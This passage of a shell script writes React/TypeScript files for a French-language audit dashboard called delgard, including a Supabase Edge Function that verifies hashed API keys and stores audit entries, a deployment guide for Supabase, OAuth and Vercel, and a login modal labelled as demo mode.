    return new Response("ok", { headers: corsHeaders });
  }

  if (req.method !== "POST") {
    return new Response(JSON.stringify({ error: "Method not allowed. Use POST." }), {
      status: 405,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }

  try {
    // 1. Check Authorization header (Authorization: Bearer <clé>)
    const authHeader = req.headers.get("Authorization") || "";
    const match = authHeader.match(/^Bearer\\s+(.+)$/i);

    if (!match || !match[1]) {
      return new Response(
        JSON.stringify({ error: "Unauthorized: Missing Authorization Bearer token", code: "MISSING_API_KEY" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const rawApiKey = match[1].trim();
    const keyHash = await hashApiKey(rawApiKey);

    // Bypass RLS using Service Role Key to verify machine API key
    const supabaseUrl = Deno.env.get("SUPABASE_URL") ?? "";
    const supabaseServiceKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY") ?? "";
    const supabaseAdmin = createClient(supabaseUrl, supabaseServiceKey);

    // 2. Retrouver le user_id dans la table api_keys par comparaison de hash
    const { data: apiKeyRecord, error: keyError } = await supabaseAdmin
      .from("api_keys")
      .select("id, user_id, label")
      .eq("key_hash", keyHash)
      .maybeSingle();

    if (keyError || !apiKeyRecord) {
      return new Response(
        JSON.stringify({ error: "Unauthorized: Invalid API key hash.", code: "INVALID_API_KEY" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const userId = apiKeyRecord.user_id;

    // Update last_used_at
    await supabaseAdmin
      .from("api_keys")
      .update({ last_used_at: new Date().toISOString() })
      .eq("id", apiKeyRecord.id);

    // 3. Valider et insérer les entrées d'audit envoyées par le CLI delgard
    const body = await req.json();
    const entries = Array.isArray(body) ? body : Array.isArray(body.entries) ? body.entries : [body];

    const recordsToInsert = await Promise.all(
      entries.map(async (entry: any) => ({
        user_id: userId,
        entry_hash: entry.entry_hash || entry.hash || await hashApiKey(JSON.stringify(entry) + Date.now()),
        prev_hash: entry.prev_hash || null,
        issuer: entry.issuer || "Delgard-CLI",
        subject: entry.subject || "agent-runtime",
        action: entry.action || "unknown",
        decision: entry.decision || "allow",
        reason: entry.reason || null,
        occurred_at: entry.occurred_at || new Date().toISOString(),
        received_at: new Date().toISOString(),
      }))
    );

    const { data: insertedData, error: insertError } = await supabaseAdmin
      .from("audit_entries")
      .insert(recordsToInsert)
      .select("id, decision, action, occurred_at");

    if (insertError) {
      return new Response(
        JSON.stringify({ error: "Database insert error", details: insertError.message }),
        { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    return new Response(
      JSON.stringify({
        success: true,
        synchronized_count: recordsToInsert.length,
        user_id: userId,
        api_key_label: apiKeyRecord.label || "Untitled Key",
        entries: insertedData,
      }),
      { status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  } catch (err: any) {
    return new Response(JSON.stringify({ error: err.message }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
`;

  const COMPLETE_VITE_FRONTEND = `// =========================================================================
// APPLICATION STATIQUE VITE + REACT + SUPABASE CLIENT (@supabase/supabase-js)
// Fichier : src/lib/supabaseClient.js & App.jsx
// =========================================================================

import { createClient } from '@supabase/supabase-js';

// 1. Initialisation du client Supabase avec les variables d'environnement Vite
const supabaseUrl = import.meta.env.VITE_SUPABASE_URL || 'https://votre-projet.supabase.co';
const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY || 'ey...';

export const supabase = createClient(supabaseUrl, supabaseAnonKey);

// 2. Exemple d'authentification Humaine et de lecture des logs dans App.jsx
/*
import React, { useState, useEffect } from 'react';
import { supabase } from './lib/supabaseClient';

export default function App() {
  const [session, setSession] = useState(null);
  const [logs, setLogs] = useState([]);

  useEffect(() => {
    supabase.auth.getSession().then(({ data: { session } }) => setSession(session));
    const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
      setSession(session);
      if (session) fetchLogs(session.user.id);
    });
    return () => subscription.unsubscribe();
  }, []);

  const fetchLogs = async (userId) => {
    const { data, error } = await supabase
      .from('audit_entries')
      .select('*')
      .eq('user_id', userId)
      .order('occurred_at', { ascending: false });
    if (!error && data) setLogs(data);
  };

  const handleGitHubLogin = () => {
    supabase.auth.signInWithOAuth({ provider: 'github' });
  };

  return (
    <div className="min-h-screen bg-[#0B1220] text-white p-8">
      <h1 className="text-2xl font-bold text-teal-400">delgard Cloud Dashboard (Static React + Supabase)</h1>
      {!session ? (
        <button onClick={handleGitHubLogin} className="mt-4 px-4 py-2 bg-teal-500 text-black font-bold rounded">
          Se connecter via Supabase Auth (GitHub)
        </button>
      ) : (
        <div className="mt-6">
          <p>Connecté en tant que : {session.user.email}</p>
          <h2 className="mt-4 text-lg font-bold">Journal d'audit ({logs.length})</h2>
          <div className="mt-2 space-y-2">
            {logs.map(l => (
              <div key={l.id} className="p-3 bg-[#111C33] rounded border border-slate-800 flex justify-between">
                <span>{l.subject} — {l.action}</span>
                <span className={l.decision === 'allow' ? 'text-teal-400' : 'text-red-400 font-bold'}>{l.decision}</span>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}
*/
`;

  return (
    <div className="space-y-8 animate-in fade-in duration-300">
      {/* Header */}
      <div className="bg-[#111C33] border border-purple-500/30 rounded-lg p-6 shadow-xl flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
        <div>
          <div className="flex items-center gap-2 mb-1">
            <h1 className="text-xl font-semibold text-white">Kit de Déploiement & SQL Supabase</h1>
            <span className="text-xs font-bold px-2.5 py-0.5 rounded-full bg-purple-500/20 text-purple-300 border border-purple-500/30 flex items-center gap-1">
              <BookOpenCheck className="w-3.5 h-3.5" />
              <span>Prêt à copier-coller</span>
            </span>
          </div>
          <p className="text-xs text-slate-400 max-w-3xl">
            Retrouvez ici le code complet de production et le guide pas-à-pas conçu pour un déploiement avec <span className="font-bold text-white">uniquement l&apos;interface web Supabase et GitHub</span> (aucun terminal ni CLI requis en local).
          </p>
        </div>

        {/* Tab switcher */}
        <div className="flex items-center gap-1 bg-[#0B1220] p-1.5 rounded-md border border-slate-800 self-stretch md:self-auto overflow-x-auto">
          {[
            { id: "guide", label: "Guide Étape par Étape", icon: BookOpenCheck },
            { id: "sql", label: "Schéma SQL & RLS", icon: Database },
            { id: "edge", label: "Edge Function /sync-audit", icon: Terminal },
            { id: "frontend", label: "Starter Vite + React", icon: Code2 },
          ].map((tab) => {
            const Icon = tab.icon;
            const isActive = activeCodeTab === tab.id;
            return (
              <button
                key={tab.id}
                onClick={() => setActiveCodeTab(tab.id as any)}
                className={clsx(
                  "px-3 py-2 rounded-lg text-xs font-bold transition-all flex items-center gap-1.5 whitespace-nowrap",
                  isActive
                    ? "bg-purple-500/20 text-purple-300 border border-purple-500/40"
                    : "text-slate-400 hover:text-white"
                )}
              >
                <Icon className="w-3.5 h-3.5" />
                <span>{tab.label}</span>
              </button>
            );
          })}
        </div>
      </div>

      {/* 1. STEP BY STEP GUIDE TAB */}
      {activeCodeTab === "guide" && (
        <div className="space-y-6">
          {/* Recommendation Banner */}
          <div className="bg-gradient-to-r from-teal-500/15 via-emerald-500/10 to-[#111C33] border border-teal-500/40 rounded-lg p-6 shadow-xl">
            <div className="flex items-start gap-3.5">
              <Globe className="w-6 h-6 text-teal-400 flex-shrink-0 mt-0.5" />
              <div className="space-y-2">
                <h3 className="text-base font-semibold text-white">
                  Recommandation de Déploiement Statique : <span className="text-teal-300">Vercel</span> ou <span className="text-teal-300">GitHub Pages</span>
                </h3>
                <p className="text-xs text-slate-300 leading-relaxed">
                  Pour une application statique (<code className="text-teal-300">React + Vite</code>) sans serveur à gérer, nous recommandons <span className="font-bold text-white">Vercel</span> en priorité absolue, suivi de Netlify et GitHub Pages.
                </p>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-3 pt-2 text-xs">
                  <div className="bg-[#0B1220] p-3 rounded-md border border-teal-500/30">
                    <span className="font-semibold text-teal-300 block mb-0.5">1. Vercel (Recommandé #1)</span>
                    Intégration GitHub native en 1 clic, SSL automatique, CDN global instantané et injection des variables <code className="text-slate-300">VITE_SUPABASE_URL</code> dès le build.
                  </div>
                  <div className="bg-[#0B1220] p-3 rounded-md border border-slate-800">
                    <span className="font-semibold text-white block mb-0.5">2. Netlify</span>
                    Parfaitement équivalent pour les Single Page Applications (SPA), avec gestion simple du routage via <code className="text-slate-300">_redirects</code>.
                  </div>
                  <div className="bg-[#0B1220] p-3 rounded-md border border-slate-800">
                    <span className="font-semibold text-white block mb-0.5">3. GitHub Pages</span>
                    Idéal si vous souhaitez 100% du projet sur GitHub, facilement automatisable via un workflow GitHub Actions <code className="text-slate-300">static.yml</code>.
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Guide Step Cards */}
          <div className="space-y-4">
            <div className="bg-[#111C33] border border-[#1E293B] rounded-lg p-6 shadow-xl">
              <div className="flex items-center gap-3 mb-3">
                <div className="w-8 h-8 rounded-full bg-teal-500 text-[#0B1220] font-semibold flex items-center justify-center text-sm">
                  1
                </div>
                <h3 className="text-base font-semibold text-white">Créer le projet Supabase dans le navigateur</h3>
              </div>
              <ol className="list-decimal list-inside space-y-2 text-xs text-slate-300 ml-3">
                <li>Rendez-vous sur <a href="https://supabase.com" target="_blank" rel="noreferrer" className="text-teal-400 font-bold underline">supabase.com</a> et connectez-vous avec votre compte GitHub.</li>
                <li>Cliquez sur <span className="font-bold text-white">&quot;New Project&quot;</span>, choisissez votre organisation et donnez-lui le nom <code className="bg-slate-800 text-teal-300 px-1.5 py-0.5 rounded">delgard-cloud</code>.</li>
                <li>Générez un mot de passe de base de données fort et sélectionnez la région la plus proche (ex: Paris ou Frankfurt).</li>
                <li>Attendez 1 à 2 minutes que le projet soit provisionné. Une fois prêt, allez dans <span className="font-bold text-white">&quot;Project Settings &rarr; API&quot;</span> et notez votre <code className="text-teal-300">Project URL</code> et votre clé <code className="text-teal-300">anon / public key</code>.</li>
              </ol>
            </div>

            <div className="bg-[#111C33] border border-[#1E293B] rounded-lg p-6 shadow-xl">
              <div className="flex items-center gap-3 mb-3">
                <div className="w-8 h-8 rounded-full bg-teal-500 text-[#0B1220] font-semibold flex items-center justify-center text-sm">
                  2
                </div>
                <h3 className="text-base font-semibold text-white">Exécuter le Schéma SQL & activer la sécurité RLS</h3>
              </div>
              <ol className="list-decimal list-inside space-y-2 text-xs text-slate-300 ml-3">
                <li>Dans le menu latéral gauche de Supabase, cliquez sur l&apos;icône <span className="font-bold text-white">&quot;SQL Editor&quot;</span> (icône de terminal / SQL).</li>
                <li>Cliquez sur <span className="font-bold text-white">&quot;New Query&quot;</span> en haut à gauche.</li>
                <li>Basculez sur l&apos;onglet <span className="text-purple-300 font-bold">Schéma SQL & RLS</span> ci-dessus, copiez l&apos;intégralité du code SQL fourni et collez-le dans la zone d&apos;édition de Supabase.</li>
                <li>Cliquez sur le bouton vert <span className="font-semibold text-white bg-teal-600 px-2 py-0.5 rounded">&quot;Run&quot;</span> en bas à droite. Le message <code className="text-emerald-400">&quot;Success. No rows returned&quot;</code> confirme que les 7 tables, la sécurité RLS et les triggers sont créés !</li>
              </ol>
            </div>

            <div className="bg-[#111C33] border border-[#1E293B] rounded-lg p-6 shadow-xl">
              <div className="flex items-center gap-3 mb-3">
                <div className="w-8 h-8 rounded-full bg-teal-500 text-[#0B1220] font-semibold flex items-center justify-center text-sm">
                  3
                </div>
                <h3 className="text-base font-semibold text-white">Configurer les fournisseurs de connexion (Google & GitHub) dans Supabase Auth</h3>
              </div>
              <ol className="list-decimal list-inside space-y-2 text-xs text-slate-300 ml-3">
                <li>Dans Supabase, allez dans <span className="font-bold text-white">&quot;Authentication &rarr; Providers&quot;</span>.</li>
                <li>
                  <span className="font-bold text-white">Pour GitHub :</span> Cliquez sur <code className="text-slate-300">GitHub</code>, activez le toggle <span className="text-emerald-400 font-bold">Enable GitHub provider</span>. Copiez la <code className="bg-slate-800 text-teal-300 px-1 py-0.5 rounded">Callback URL (for OAuth)</code> affichée. Allez sur <span className="italic">GitHub.com &rarr; Settings &rarr; Developer Settings &rarr; OAuth Apps &rarr; New OAuth App</span>, collez la Callback URL, récupérez votre <code className="text-teal-300">Client ID</code> et <code className="text-teal-300">Client Secret</code>, puis collez-les dans Supabase et cliquez sur <span className="font-bold text-white">Save</span>.
                </li>
                <li>
                  <span className="font-bold text-white">Pour Google :</span> Cliquez sur <code className="text-slate-300">Google</code>, activez-le, et collez l&apos;ID client et le secret client créés dans la <span className="italic">Google Cloud Console (API & Services &rarr; Identifiants &rarr; ID client OAuth 2.0 &rarr; Application Web)</span> en utilisant la même Callback URL fournie par Supabase.
                </li>
                <li>
                  <span className="font-bold text-white">Email / Mot de passe :</span> Active par défaut sous <span className="italic">Authentication &rarr; Providers &rarr; Email</span>.
                </li>
              </ol>
            </div>

            <div className="bg-[#111C33] border border-[#1E293B] rounded-lg p-6 shadow-xl">
              <div className="flex items-center gap-3 mb-3">
                <div className="w-8 h-8 rounded-full bg-teal-500 text-[#0B1220] font-semibold flex items-center justify-center text-sm">
                  4
                </div>
                <h3 className="text-base font-semibold text-white">Déployer la fonction Edge /sync-audit via GitHub (Sans terminal local)</h3>
              </div>
              <ol className="list-decimal list-inside space-y-2 text-xs text-slate-300 ml-3">
                <li>Dans votre dépôt GitHub, créez le fichier <code className="bg-slate-800 text-teal-300 px-1.5 py-0.5 rounded">supabase/functions/sync-audit/index.ts</code> et collez le code TypeScript fourni dans l&apos;onglet <span className="text-purple-300 font-bold">Edge Function /sync-audit</span>.</li>
                <li>
                  Pour déployer sans terminal local, vous pouvez soit utiliser le <span className="font-bold text-white">Dashboard Supabase (Functions &rarr; Create a Function &rarr; sync-audit &rarr; coller le code et Save)</span>, soit ajouter un workflow GitHub Actions <code className="bg-slate-800 text-teal-300 px-1 py-0.5 rounded">.github/workflows/deploy_edge.yml</code> :
                  <div className="bg-[#0B1220] p-3 rounded-md border border-slate-800 font-mono text-[11px] text-teal-300 mt-2">
                    {`name: Deploy Supabase Edge Functions\non: { push: { paths: ['supabase/functions/**'] } }\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n      - uses: supabase/setup-cli@v1\n      - run: supabase functions deploy sync-audit --project-ref \${{ secrets.SUPABASE_PROJECT_ID }}\n        env: { SUPABASE_ACCESS_TOKEN: \${{ secrets.SUPABASE_ACCESS_TOKEN }} }`}
                  </div>
                </li>
              </ol>
            </div>

            <div className="bg-[#111C33] border border-[#1E293B] rounded-lg p-6 shadow-xl">
              <div className="flex items-center gap-3 mb-3">
                <div className="w-8 h-8 rounded-full bg-teal-500 text-[#0B1220] font-semibold flex items-center justify-center text-sm">
                  5
                </div>
                <h3 className="text-base font-semibold text-white">Déployer le Frontend statique en 1 clic sur Vercel</h3>
              </div>
              <ol className="list-decimal list-inside space-y-2 text-xs text-slate-300 ml-3">
                <li>Poussez le code React + Vite (<code className="text-teal-300">App.jsx</code> + <code className="text-teal-300">package.json</code>) sur un dépôt GitHub.</li>
                <li>Connectez-vous sur <a href="https://vercel.com" target="_blank" rel="noreferrer" className="text-teal-400 font-bold underline">vercel.com</a>, cliquez sur <span className="font-bold text-white">&quot;Add New Project&quot;</span> et importez votre dépôt GitHub.</li>
                <li>Dans la section <span className="font-bold text-white">&quot;Environment Variables&quot;</span> de Vercel, ajoutez :
                  <ul className="list-disc list-inside ml-4 mt-1 font-mono text-teal-300">
                    <li>VITE_SUPABASE_URL = https://votre-projet.supabase.co</li>
                    <li>VITE_SUPABASE_ANON_KEY = eyJhbGci... (votre clé publique)</li>
                  </ul>
                </li>
                <li>Cliquez sur <span className="font-bold text-white bg-emerald-600 px-2 py-0.5 rounded">&quot;Deploy&quot;</span>. Votre dashboard est en ligne sur une URL HTTPS rapide !</li>
              </ol>
            </div>
          </div>
        </div>
      )}

      {/* 2. SQL TAB */}
      {activeCodeTab === "sql" && (
        <div className="bg-[#111C33] border border-[#1E293B] rounded-lg p-6 shadow-xl space-y-4">
          <div className="flex items-center justify-between">
            <div>
              <h3 className="text-base font-semibold text-white flex items-center gap-2">
                <Database className="w-4 h-4 text-teal-400" />
                <span>Schéma PostgreSQL & Policies RLS explicites</span>
              </h3>
              <p className="text-xs text-slate-400">À exécuter dans l&apos;onglet SQL Editor de Supabase pour initialiser les 7 tables et leur sécurité.</p>
            </div>
            <button
              onClick={() => handleCopy(COMPLETE_SQL_SCHEMA, "sql")}
              className="px-4 py-2 rounded-md bg-purple-500 hover:bg-purple-400 text-white font-semibold text-xs flex items-center gap-2 transition-all"
            >
              {copiedCode === "sql" ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
              <span>{copiedCode === "sql" ? "Copié dans le presse-papier !" : "Copier le SQL complet"}</span>
            </button>
          </div>
          <div className="bg-[#0B1220] border border-slate-800 rounded-md p-4 font-mono text-xs text-teal-300 max-h-[550px] overflow-y-auto whitespace-pre">
            {COMPLETE_SQL_SCHEMA}
          </div>
        </div>
      )}

      {/* 3. EDGE FUNCTION TAB */}
      {activeCodeTab === "edge" && (
        <div className="bg-[#111C33] border border-[#1E293B] rounded-lg p-6 shadow-xl space-y-4">
          <div className="flex items-center justify-between">
            <div>
              <h3 className="text-base font-semibold text-white flex items-center gap-2">
                <Terminal className="w-4 h-4 text-teal-400" />
                <span>Supabase Edge Function (<code className="text-purple-300">POST /sync-audit</code>)</span>
              </h3>
              <p className="text-xs text-slate-400">Fichier à placer dans <code className="text-slate-300">supabase/functions/sync-audit/index.ts</code>.</p>
            </div>
            <button
              onClick={() => handleCopy(COMPLETE_EDGE_FUNCTION, "edge")}
              className="px-4 py-2 rounded-md bg-purple-500 hover:bg-purple-400 text-white font-semibold text-xs flex items-center gap-2 transition-all"
            >
              {copiedCode === "edge" ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
              <span>{copiedCode === "edge" ? "Copié dans le presse-papier !" : "Copier la fonction Edge"}</span>
            </button>
          </div>
          <div className="bg-[#0B1220] border border-slate-800 rounded-md p-4 font-mono text-xs text-teal-300 max-h-[550px] overflow-y-auto whitespace-pre">
            {COMPLETE_EDGE_FUNCTION}
          </div>
        </div>
      )}

      {/* 4. FRONTEND TAB */}
      {activeCodeTab === "frontend" && (
        <div className="bg-[#111C33] border border-[#1E293B] rounded-lg p-6 shadow-xl space-y-4">
          <div className="flex items-center justify-between">
            <div>
              <h3 className="text-base font-semibold text-white flex items-center gap-2">
                <Code2 className="w-4 h-4 text-teal-400" />
                <span>Frontend Statique (React + Vite + Supabase Client SDK)</span>
              </h3>
              <p className="text-xs text-slate-400">Exemple d&apos;application sans serveur qui parle directement à Supabase en JS.</p>
            </div>
            <button
              onClick={() => handleCopy(COMPLETE_VITE_FRONTEND, "frontend")}
              className="px-4 py-2 rounded-md bg-purple-500 hover:bg-purple-400 text-white font-semibold text-xs flex items-center gap-2 transition-all"
            >
              {copiedCode === "frontend" ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
              <span>{copiedCode === "frontend" ? "Copié dans le presse-papier !" : "Copier le code Vite"}</span>
            </button>
          </div>
          <div className="bg-[#0B1220] border border-slate-800 rounded-md p-4 font-mono text-xs text-teal-300 max-h-[550px] overflow-y-auto whitespace-pre">
            {COMPLETE_VITE_FRONTEND}
          </div>
        </div>
      )}
    </div>
  );
}
DELGARD_FILE_EOF_9f3a2b

mkdir -p "src/components"
cat > "src/components/LoginModal.tsx" << 'DELGARD_FILE_EOF_9f3a2b'
"use client";

import React, { useState } from "react";
import {
  X,
  Mail,
  Lock,
  CheckCircle2,
  Terminal,
  Sparkles,
  ArrowRight,
} from "lucide-react";

interface LoginModalProps {
  isOpen: boolean;
  onClose: () => void;
  currentUser: any;
  onSimulateLogin: (provider: string, email?: string) => void;
}

export function LoginModal({ isOpen, onClose, currentUser, onSimulateLogin }: LoginModalProps) {
  const [authMode, setAuthMode] = useState<"login" | "signup">("login");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [statusMessage, setStatusMessage] = useState<{ type: "success" | "info" | "error"; text: string } | null>(null);

  if (!isOpen) return null;

  const handleEmailSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password) {
      setStatusMessage({ type: "error", text: "Veuillez entrer un email et un mot de passe." });
      return;
    }
    onSimulateLogin("email", email);
    setStatusMessage({
      type: "success",
      text: `Connecté à la session Supabase Auth en tant que ${email}`,
    });
    setTimeout(() => {
      onClose();
    }, 1000);
  };

  const handleProviderLogin = (provider: "github" | "google") => {
    onSimulateLogin(provider);
    setStatusMessage({
      type: "success",
      text: `Authentification réussie via le provider ${provider.toUpperCase()}`,
    });
    setTimeout(() => {
      onClose();
    }, 1000);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-[#0B1220]/80 backdrop-blur-sm animate-in fade-in duration-200">
      <div className="relative w-full max-w-lg bg-[#111C33] border border-[#1E293B] rounded-lg shadow-2xl overflow-hidden p-6 text-slate-200">
        {/* Close Button */}
        <button
          onClick={onClose}
          className="absolute top-5 right-5 text-slate-400 hover:text-white bg-slate-800/50 hover:bg-slate-800 p-1.5 rounded-lg transition-colors"
        >
          <X className="w-5 h-5" />
        </button>

        {/* Modal Header */}
        <div className="flex items-center gap-3 mb-5">
          <img src="/logo-icon.svg" alt="delgard" className="w-11 h-11 rounded-lg" />
          <div>
            <h2 className="text-lg font-semibold text-white">Connexion</h2>
            <p className="text-xs text-slate-400">Accès au dashboard delgard</p>
          </div>
        </div>

        {/* Honest demo-mode notice — this is not wired to real OAuth yet */}
        <div className="bg-[color:var(--warning)]/10 border border-[color:var(--warning)]/30 rounded-md p-3 mb-4 text-xs text-amber-200 flex items-start gap-2.5">
          <Terminal className="w-4 h-4 text-amber-300 flex-shrink-0 mt-0.5" />
          <span>
            <strong>Mode démo :</strong> ces boutons changent la session affichée localement, mais ne passent pas encore par un vrai fournisseur d&apos;identité. La connexion Google/GitHub réelle sera branchée une fois le projet Supabase créé.
          </span>
        </div>

        {/* Human vs machine identity note */}
        <div className="bg-[#0B1220]/80 border border-[#1E2940] rounded-md p-3 mb-6 text-xs text-slate-300 flex items-start gap-3">
          <Terminal className="w-4 h-4 text-[color:var(--accent)] flex-shrink-0 mt-0.5" />
          <div>
            Cette connexion est pour un <strong className="text-slate-200">humain</strong> qui consulte le dashboard.
            Le CLI <code className="bg-slate-800 text-teal-300 px-1 py-0.5 rounded">delgard</code> dans votre code utilise une <strong className="text-slate-200">clé API</strong> séparée (onglet dédié), pas cette connexion.
          </div>
        </div>

        {statusMessage && (
          <div
            className={`p-3.5 rounded-md text-xs mb-5 flex items-center gap-2 border ${
              statusMessage.type === "success"
                ? "bg-emerald-500/10 text-emerald-300 border-emerald-500/30"
                : statusMessage.type === "error"
                ? "bg-red-500/10 text-red-300 border-red-500/30"
                : "bg-blue-500/10 text-blue-300 border-blue-500/30"
            }`}
          >
            <CheckCircle2 className="w-4 h-4 flex-shrink-0" />
            <span>{statusMessage.text}</span>
          </div>
        )}

        {/* OAuth Buttons */}
        <div className="space-y-3 mb-6">
          <button
            onClick={() => handleProviderLogin("github")}
            className="w-full py-3 px-4 rounded-md bg-slate-800/80 hover:bg-slate-800 border border-slate-700/80 hover:border-teal-500/40 text-white font-semibold text-sm flex items-center justify-center gap-3 transition-all group"
          >
            <svg className="w-5 h-5 fill-current" viewBox="0 0 24 24">
              <path fillRule="evenodd" clipRule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.53 1.032 1.53 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" />
            </svg>
            <span>Continuer avec GitHub</span>
            <ArrowRight className="w-4 h-4 ml-auto text-slate-500 group-hover:translate-x-1 transition-transform" />
          </button>

          <button
            onClick={() => handleProviderLogin("google")}
            className="w-full py-3 px-4 rounded-md bg-slate-800/80 hover:bg-slate-800 border border-slate-700/80 hover:border-teal-500/40 text-white font-semibold text-sm flex items-center justify-center gap-3 transition-all group"
          >
            <svg className="w-5 h-5" viewBox="0 0 24 24">
              <path
                fill="#4285F4"
                d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
              />
              <path
                fill="#34A853"
                d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
              />
              <path
                fill="#FBBC05"
                d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"
              />
              <path
                fill="#EA4335"
                d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"
              />
            </svg>
            <span>Continuer avec Google</span>
            <ArrowRight className="w-4 h-4 ml-auto text-slate-500 group-hover:translate-x-1 transition-transform" />
          </button>
        </div>

        {/* Divider */}
        <div className="relative flex items-center justify-center mb-6">
          <div className="border-t border-slate-700/80 w-full" />
          <span className="bg-[#111C33] px-3 text-xs text-slate-400 font-medium whitespace-nowrap">
            Ou avec email et mot de passe
          </span>
          <div className="border-t border-slate-700/80 w-full" />
        </div>

        {/* Email & Password Form */}
        <form onSubmit={handleEmailSubmit} className="space-y-4">
          <div>
            <label className="block text-xs font-semibold text-slate-300 mb-1.5">
              Adresse Email (Supabase Auth)
            </label>
            <div className="relative">
              <Mail className="absolute left-3.5 top-3 w-4 h-4 text-slate-500" />
              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="nom@entreprise.com"
                required
                className="w-full bg-[#0B1220] border border-slate-700/80 rounded-md py-2.5 pl-10 pr-4 text-sm text-white focus:outline-none focus:border-teal-500 transition-colors placeholder:text-slate-600"
              />
            </div>
          </div>

          <div>
            <label className="block text-xs font-semibold text-slate-300 mb-1.5">
              Mot de passe
            </label>
            <div className="relative">
              <Lock className="absolute left-3.5 top-3 w-4 h-4 text-slate-500" />
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="••••••••••••"
                required
                className="w-full bg-[#0B1220] border border-slate-700/80 rounded-md py-2.5 pl-10 pr-4 text-sm text-white focus:outline-none focus:border-teal-500 transition-colors placeholder:text-slate-600"
              />
            </div>
          </div>

          <div className="pt-2">
            <button
              type="submit"
              className="w-full py-3 rounded-md bg-[color:var(--accent)] hover:bg-[#26bfab] text-[#0B1220] font-semibold text-sm shadow-none transition-all flex items-center justify-center gap-2"
            >
              <Sparkles className="w-4 h-4 fill-current" />
              <span>{authMode === "login" ? "Se connecter" : "Créer mon compte"} via Supabase</span>
            </button>
          </div>
        </form>

        <div className="mt-5 text-center text-xs text-slate-400">
          Actuellement connecté en tant que : <span className="font-bold text-teal-400">{currentUser?.email}</span>
        </div>
      </div>
    </div>
  );
}
DELGARD_FILE_EOF_9f3a2b

mkdir -p "src/components"
cat > "src/components/Navbar.tsx" << 'DELGARD_FILE_EOF_9f3a2b'
"use client";

import React from "react";
import Image from "next/image";
import {
  ListFilter,
  KeyRound,
  Users,
  BellRing,
  Settings,
  BookOpenCheck,
  Zap,
  Lock,
  RefreshCw,
  UserCheck,
} from "lucide-react";
import clsx from "clsx";

interface NavbarProps {
  activeTab: string;
  setActiveTab: (tab: any) => void;
  user: any;
  plan: string;
  onTogglePlan: (newPlan: string) => void;
  onResetDemo: () => void;
  isResetting: boolean;
  onOpenLogin: () => void;
}

export function Navbar({
  activeTab,
  setActiveTab,
  user,
  plan,
  onTogglePlan,
  onResetDemo,
  isResetting,
  onOpenLogin,
}: NavbarProps) {
  const navItems = [
    { id: "audit", label: "Journal d'audit", icon: ListFilter, badge: null as React.ReactNode },
    { id: "keys", label: "Clés API", icon: KeyRound, badge: null as React.ReactNode },
    {
      id: "team",
      label: "Équipe",
      icon: Users,
      badge: plan === "free" ? <Lock className="w-3 h-3 text-[color:var(--warning)]" /> : null,
    },
    {
      id: "alerts",
      label: "Alertes",
      icon: BellRing,
      badge: plan === "free" ? <Lock className="w-3 h-3 text-[color:var(--warning)]" /> : null,
    },
    { id: "account", label: "Compte", icon: Settings, badge: null as React.ReactNode },
    { id: "deploy", label: "Déploiement", icon: BookOpenCheck, badge: null as React.ReactNode },
  ];

  return (
    <header className="sticky top-0 z-50 bg-[#0B1220]/95 backdrop-blur-md border-b border-[#1E2940] px-4 lg:px-8 py-3">
      <div className="max-w-7xl mx-auto flex items-center justify-between gap-4">
        {/* Brand & Logo */}
        <div
          onClick={() => setActiveTab("audit")}
          className="flex items-center gap-2.5 cursor-pointer shrink-0"
        >
